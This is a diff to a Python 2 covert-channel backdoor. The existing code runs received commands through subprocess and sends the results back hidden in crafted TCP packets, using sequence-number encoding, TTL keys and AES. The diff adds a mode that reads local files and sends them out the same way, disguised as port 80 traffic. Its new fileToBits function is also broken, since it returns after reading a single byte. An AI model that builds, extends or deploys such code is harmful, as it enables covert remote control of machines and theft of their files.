@@ -3,6 +3,7 @@ from Crypto.Cipher import AES
 import uuid
 import time
 import subprocess
+import binascii
 
 # Inputs
 localIP = "192.168.0.23"
@@ -183,7 +184,7 @@ def handle(packet):
                     result = runCommand(command)
                     #print "Result is " + result
                     #threaad.sleep(5)
-                    sendmessage("TCP",result)
+                    sendmessage("TCP",result,"command")
                     #Run the command
                 # else:
                     #DEBUG: print "Max not reached, don't reconstruct command yet"
@@ -201,6 +202,17 @@ def messageToBits(message):
         messageData += str(var)
     # print "Message data is " + messageData
     return messageData
+
+def fileToBits(filePath):
+    filePath = filePath
+    file = open(filePath, "rb")
+    with file:
+        byte = file.read(1)
+        hexadecimal = binascii.hexlify(byte)
+        decimal = int(hexadecimal, 16)
+        binary = bin(decimal)[2:].zfill(8)
+        print binary
+        return binary
 
 def chunkMessage(message,protocol):
     # print "Message is "  + message
@@ -254,7 +266,7 @@ def generateUID():
     return str(uid)
 
 
-def craftPackets(data,protocol):
+def craftPackets(data,protocol,type):
     packets = []
     #If the length of the number is larger than what is allowed in one packet, split it
     counter = 0
@@ -264,12 +276,12 @@ def craftPackets(data,protocol):
     #print "The number of messages to send is " + str(len(data))
     while (counter < len(data)):
         #print str(data[counter])
-        packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID))
+        packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID,type))
         counter = counter + 1
 
     return packets
 
-def craftPacket(data,protocol,position,total,UID):
+def craftPacket(data,protocol,position,total,UID,type):
     global clientIP
     global ttlKey
     global srcPort
@@ -280,7 +292,8 @@ def craftPacket(data,protocol,position,total,UID):
     global authentication
 
     #print "Data is " + str(data)
-
+    if(type == "file"):
+        dstPort = 80
     #print "Crafting packet for # " + str(position) + " / " + str(total)
     if(protocol == "TCP"):
         #print "Put Data " + str(int(data,2)) + "into Seq Number"
@@ -293,7 +306,7 @@ def craftPacket(data,protocol,position,total,UID):
          ":"+str(total)))
     return packet
 
-def sendmessage(protocol,message):
+def sendmessage(protocol,message,type):
     global clientIP
     global ttlKey
     global srcPort
@@ -301,14 +314,19 @@ def sendmessage(protocol,message):
     global encryptionKey
     global IV
 	#1. Encrypt the message
-	#2. Convert message to ASCII to Bits
-    message = messageToBits(message)
+    if(type == "command"):
+	#2A. Convert message to ASCII to Bits
+        message = messageToBits(message)
+    elif(type == "file"):
+    #2B. Convert file to bits
+        filePath = message
+        message = fileToBits(filePath)
     #print "Message is " + message
     #3. Chunk message into the size appropriate for the protocol
     chunks = chunkMessage(message,protocol)
     #print "Chunks are " + str(chunks)
 	#4. Craft packets
-    packets = craftPackets(chunks,protocol)
+    packets = craftPackets(chunks,protocol,type)
 
 	#5. Send the packets
     for packet in packets:
